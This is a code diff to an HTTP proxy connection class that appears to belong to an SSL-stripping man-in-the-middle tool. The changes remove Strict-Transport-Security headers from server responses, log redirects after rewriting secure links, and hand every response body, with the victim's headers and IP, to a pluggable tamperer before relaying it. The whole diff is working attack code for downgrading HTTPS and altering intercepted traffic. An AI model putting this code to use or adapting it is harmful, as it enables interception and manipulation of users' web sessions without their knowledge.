@@ -20,6 +20,7 @@ import logging, re, string, random, zlib, gzip, StringIO
 
 from twisted.web.http import HTTPClient
 from URLMonitor import URLMonitor
+from ResponseTampererFactory import ResponseTampererFactory
 
 class ServerConnection(HTTPClient):
 
@@ -39,6 +40,7 @@ class ServerConnection(HTTPClient):
         self.headers          = headers
         self.client           = client
         self.urlMonitor       = URLMonitor.getInstance()
+        self.responseTamperer = ResponseTampererFactory.getTampererInstance()
         self.isImageRequest   = False
         self.isCompressed     = False
         self.contentLength    = None
@@ -69,7 +71,7 @@ class ServerConnection(HTTPClient):
         logging.log(self.getLogLevel(), "HTTP connection made.")
         self.sendRequest()
         self.sendHeaders()
-        
+
         if (self.command == 'POST'):
             self.sendPostData()
 
@@ -82,6 +84,7 @@ class ServerConnection(HTTPClient):
 
         if (key.lower() == 'location'):
             value = self.replaceSecureLinks(value)
+            self.urlMonitor.addRedirection(self.client.uri, value)
 
         if (key.lower() == 'content-type'):
             if (value.find('image') != -1):
@@ -96,6 +99,8 @@ class ServerConnection(HTTPClient):
             self.contentLength = value
         elif (key.lower() == 'set-cookie'):
             self.client.responseHeaders.addRawHeader(key, value)
+        elif (key.lower() == 'strict-transport-security'):
+						logging.debug("Removing STS header")
         else:
             self.client.setHeader(key, value)
 
@@ -105,7 +110,7 @@ class ServerConnection(HTTPClient):
 
        if self.length == 0:
            self.shutdown()
-                        
+
     def handleResponsePart(self, data):
         if (self.isImageRequest):
             self.client.write(data)
@@ -122,14 +127,17 @@ class ServerConnection(HTTPClient):
         if (self.isCompressed):
             logging.debug("Decompressing content...")
             data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
-            
+
         logging.log(self.getLogLevel(), "Read from server:\n" + data)
 
         data = self.replaceSecureLinks(data)
 
+        if self.responseTamperer:
+          data = self.responseTamperer.tamper(self.client.uri, data, self.client.responseHeaders, self.client.getAllHeaders(), self.client.getClientIP())
+
         if (self.contentLength != None):
             self.client.setHeader('Content-Length', len(data))
-        
+
         self.client.write(data)
         self.shutdown()
 
